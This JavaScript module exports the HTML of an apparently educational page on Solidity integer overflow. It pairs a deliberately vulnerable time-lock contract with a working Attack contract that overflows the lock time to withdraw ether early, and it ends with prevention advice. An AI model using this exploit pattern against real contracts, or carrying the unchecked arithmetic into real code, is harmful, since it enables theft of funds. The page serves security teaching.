// metadata
export const version = "0.8.10"
export const title = "Arithmetic Overflow and Underflow"
export const description =
  "An example of hacking Solidity with arithmetic overflow / underflow"

const html = `<h3 id="vulnerability">Vulnerability</h3>
<h5 id="solidity--08">Solidity &lt; 0.8</h5>
<p>Integers in Solidity overflow / underflow without any errors</p>
<h5 id="solidity--08-1">Solidity &gt;= 0.8</h5>
<p>Default behaviour of Solidity 0.8 for overflow / underflow is to throw an error.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>

<span class="hljs-comment">// This contract is designed to act as a time vault.</span>
<span class="hljs-comment">// User can deposit into this contract but cannot withdraw for atleast a week.</span>
<span class="hljs-comment">// User can also extend the wait time beyond the 1 week waiting period.</span>

<span class="hljs-comment">/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">TimeLock</span> </span>{
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> lockTime;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">=</span> <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> <span class="hljs-operator">+</span> <span class="hljs-number">1</span> <span class="hljs-literal">weeks</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increaseLockTime</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _secondsToIncrease</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> _secondsToIncrease;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>, <span class="hljs-string">"Insufficient funds"</span>);
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> <span class="hljs-operator">&gt;</span> lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"Lock time not expired"</span>);

        <span class="hljs-keyword">uint</span> amount <span class="hljs-operator">=</span> balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: amount}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    TimeLock timeLock;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">TimeLock _timeLock</span>) </span>{
        timeLock <span class="hljs-operator">=</span> TimeLock(_timeLock);
    }

    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        timeLock.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>}();
        <span class="hljs-comment">/*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */</span>
        timeLock.increaseLockTime(
            <span class="hljs-keyword">type</span>(<span class="hljs-keyword">uint</span>).<span class="hljs-built_in">max</span> <span class="hljs-operator">+</span> <span class="hljs-number">1</span> <span class="hljs-operator">-</span> timeLock.lockTime(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>))
        );
        timeLock.withdraw();
    }
}
</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<ul>
<li><p>Use <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol" target="__blank">SafeMath</a> to will prevent arithmetic overflow and underflow</p>
</li>
<li><p>Solidity 0.8 defaults to throwing an error for overflow / underflow</p>
</li>
</ul>
`

export default html
